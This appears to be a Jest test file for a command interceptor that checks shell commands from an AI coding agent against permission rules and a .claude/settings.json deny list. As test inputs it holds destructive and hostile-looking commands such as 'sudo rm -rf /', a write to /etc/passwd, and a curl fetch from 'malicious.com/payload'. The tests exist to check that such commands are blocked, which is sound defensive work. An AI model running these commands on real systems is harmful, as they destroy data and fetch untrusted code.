import { CommandInterceptor, formatCommandAnalysis } from '../utils/command-interceptor';
import {
  PermissionManager,
  ActionType,
  PermissionScope,
  PermissionConfig,
  DefaultPermissions,
} from '../utils/permissions';
import { WinstonLogger } from '../logger-winston';

// Mock logger
const mockLogger = {
  debug: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
} as unknown as WinstonLogger;

describe('CommandInterceptor', () => {
  let permissionManager: PermissionManager;
  let interceptor: CommandInterceptor;

  beforeEach(() => {
    jest.clearAllMocks();

    // Create restrictive permissions config for testing
    const config: PermissionConfig = {
      rules: [
        {
          id: 'block-rm-rf',
          action: ActionType.FILE_DELETE,
          scope: PermissionScope.PATTERN,
          target: '/*',
          allowed: false,
          reason: 'Root directory deletion not allowed',
          priority: 1000,
        },
        {
          id: 'block-system-commands',
          action: ActionType.SYSTEM_COMMAND,
          scope: PermissionScope.PATTERN,
          target: 'sudo',
          allowed: false,
          reason: 'Sudo commands not allowed',
          priority: 900,
        },
        {
          id: 'allow-safe-reads',
          action: ActionType.FILE_READ,
          scope: PermissionScope.WORKTREE,
          allowed: true,
          reason: 'Reading within worktree is allowed',
          priority: 500,
        },
      ],
      defaultAllow: false, // Changed to false for stricter testing
      enableLogging: false,
      strictMode: true,
    };

    permissionManager = new PermissionManager(config, mockLogger);
    interceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
  });

  describe('analyzeCommand', () => {
    it('should block dangerous commands', () => {
      const result = interceptor.analyzeCommand('sudo rm -rf /');

      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('error');
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should block commands based on permission rules', () => {
      const result = interceptor.analyzeCommand('rm -rf /important-file');

      expect(result.allowed).toBe(false);
      expect(result.action).toBe(ActionType.FILE_DELETE);
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should allow permitted commands', () => {
      const result = interceptor.analyzeCommand('cat test-file.txt');

      expect(result.allowed).toBe(true);
      expect(result.action).toBe(ActionType.FILE_READ);
      expect(result.reason).toContain('Command permitted');
    });

    it('should handle system commands', () => {
      const result = interceptor.analyzeCommand('sudo systemctl restart nginx');

      expect(result.allowed).toBe(false);
      expect(result.action).toBe(ActionType.SYSTEM_COMMAND);
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should block unrecognized commands in strict mode', () => {
      const result = interceptor.analyzeCommand('unknown-command --flag value');

      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('error');
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should detect file write operations', () => {
      const result = interceptor.analyzeCommand('echo "content" > /etc/passwd');

      expect(result.action).toBe(ActionType.FILE_WRITE);
      expect(result.target).toContain('/etc/passwd');
    });

    it('should detect network operations', () => {
      const result = interceptor.analyzeCommand('curl https://malicious.com/payload');

      expect(result.action).toBe(ActionType.NETWORK_REQUEST);
      expect(result.target).toContain('https://malicious.com/payload');
    });

    it('should not provide suggestions (disabled)', () => {
      const result = interceptor.analyzeCommand('rm important-file.txt');

      expect(result.allowed).toBe(false);
      expect(result.suggestion).toBeUndefined();
    });
  });

  describe('command pattern matching', () => {
    it('should match file read patterns', () => {
      const commands = [
        'cat file.txt',
        'less document.md',
        'head -n 10 log.txt',
        'grep "pattern" file.txt',
      ];

      commands.forEach(command => {
        const result = interceptor.analyzeCommand(command);
        expect(result.action).toBe(ActionType.FILE_READ);
      });
    });

    it('should match file write patterns', () => {
      const commands = ['vim script.sh', 'nano config.txt', 'echo "test" > output.txt'];

      commands.forEach(command => {
        const result = interceptor.analyzeCommand(command);
        expect(result.action).toBe(ActionType.FILE_WRITE);
      });
    });

    it('should match file delete patterns', () => {
      const commands = ['rm file.txt', 'unlink symlink'];

      commands.forEach(command => {
        const result = interceptor.analyzeCommand(command);
        expect(result.action).toBe(ActionType.FILE_DELETE);
      });
    });

    it('should match directory operations', () => {
      const result = interceptor.analyzeCommand('mkdir new-directory');
      expect(result.action).toBe(ActionType.DIRECTORY_CREATE);

      const result2 = interceptor.analyzeCommand('rmdir old-directory');
      expect(result2.action).toBe(ActionType.DIRECTORY_DELETE);
    });
  });

  describe('target resolution', () => {
    it('should detect file operations with target', () => {
      const result = interceptor.analyzeCommand('cat ./local-file.txt');
      expect(result.target).toBe('./local-file.txt');
      expect(result.action).toBe(ActionType.FILE_READ);
    });

    it('should preserve absolute paths in target', () => {
      const result = interceptor.analyzeCommand('cat /absolute/path/file.txt');
      expect(result.target).toBe('/absolute/path/file.txt');
      expect(result.action).toBe(ActionType.FILE_READ);
    });
  });

  describe('Claude deny list functionality', () => {
    beforeEach(() => {
      jest.clearAllMocks();
    });

    it('should block Bash commands matching deny list patterns', () => {
      // Mock the claudeDenyList with a Bash pattern
      const mockInterceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
      (mockInterceptor as any).claudeDenyList = ['Bash(HUSKY=0*:'];

      const result = mockInterceptor.analyzeCommand('HUSKY=0 npm run test');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Command blocked by .claude/settings.json deny list');
      expect(result.severity).toBe('error');
    });

    it('should block Update() file patterns', () => {
      const mockInterceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
      (mockInterceptor as any).claudeDenyList = ['Update(package.json)'];

      // Test various file editing patterns
      const commands = [
        'vim package.json',
        'nano package.json', 
        'echo "test" > package.json',
        'echo "test" >> package.json',
        'tee package.json'
      ];

      commands.forEach(command => {
        const result = mockInterceptor.analyzeCommand(command);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('Command blocked by .claude/settings.json deny list');
      });
    });

    it('should allow commands not matching deny list patterns', () => {
      const mockInterceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
      (mockInterceptor as any).claudeDenyList = ['Bash(HUSKY=0*:', 'Update(package.json)'];

      const result = mockInterceptor.analyzeCommand('cat README.md');
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toContain('Command permitted');
    });

    it('should handle empty deny list', () => {
      const mockInterceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
      (mockInterceptor as any).claudeDenyList = [];

      const result = mockInterceptor.analyzeCommand('rm -rf /');
      
      // Should be blocked by permission rules, not deny list
      expect(result.allowed).toBe(false);
      expect(result.reason).not.toContain('.claude/settings.json');
    });

    it('should handle regex escaping in Update patterns', () => {
      const mockInterceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
      (mockInterceptor as any).claudeDenyList = ['Update(file.with.dots.json)'];

      const result = mockInterceptor.analyzeCommand('vim file.with.dots.json');
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Update(file.with.dots.json)');
    });

    it('should handle wildcard patterns in Bash deny list', () => {
      const mockInterceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
      (mockInterceptor as any).claudeDenyList = ['Bash(npm run*:'];

      const commands = [
        'npm run build',
        'npm run test',
        'npm run lint'
      ];

      commands.forEach(command => {
        const result = mockInterceptor.analyzeCommand(command);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('Bash(npm run*:');
      });
    });
  });

  describe('createDefault method', () => {
    it('should create interceptor instance', async () => {
      // Test the static method functionality
      const interceptor = await CommandInterceptor.createDefault(mockLogger, '/test/worktree');
      
      expect(interceptor).toBeInstanceOf(CommandInterceptor);
    });

    it('should handle config loading errors gracefully', async () => {
      // This will use default permissions when config file doesn't exist
      const interceptor = await CommandInterceptor.createDefault(mockLogger, '/test/worktree');
      
      expect(interceptor).toBeInstanceOf(CommandInterceptor);
      
      // Test that it works with a simple command
      const result = interceptor.analyzeCommand('ls');
      expect(result).toBeDefined();
    });
  });

  describe('edge cases and error handling', () => {
    it('should handle empty commands', () => {
      const result = interceptor.analyzeCommand('');
      
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('error');
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should handle whitespace-only commands', () => {
      const result = interceptor.analyzeCommand('   \t\n   ');
      
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('error');
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should handle commands with special characters', () => {
      const result = interceptor.analyzeCommand('echo "Hello $USER & welcome!"');
      
      expect(result.action).toBe(ActionType.SYSTEM_COMMAND);
      expect(result.target).toBe('echo');
      expect(result.allowed).toBe(false); // Blocked by strict permissions
    });

    it('should handle very long commands', () => {
      const longCommand = 'echo ' + 'a'.repeat(1000);
      const result = interceptor.analyzeCommand(longCommand);
      
      expect(result.action).toBe(ActionType.SYSTEM_COMMAND);
      expect(result.target).toBe('echo');
      expect(result.allowed).toBe(false); // Blocked by strict permissions
    });
  });
});

describe('formatCommandAnalysis', () => {
  it('should format analysis results properly', () => {
    const result = {
      allowed: false,
      reason: 'Command blocked by permissions',
      action: ActionType.FILE_DELETE,
      target: '/important-file',
      severity: 'error' as const,
      suggestion: '', // Suggestions removed
    };

    const formatted = formatCommandAnalysis(result);

    expect(formatted).toContain('Command blocked by permissions');
    expect(formatted).toContain('Action: file_delete');
    expect(formatted).toContain('Target: /important-file');
    // Suggestion removed - test no longer expects it
  });

  it('should handle results without action/target', () => {
    const result = {
      allowed: true,
      reason: 'Command permitted',
      severity: 'info' as const,
    };

    const formatted = formatCommandAnalysis(result);
    expect(formatted).toBe('Command permitted');
  });
});
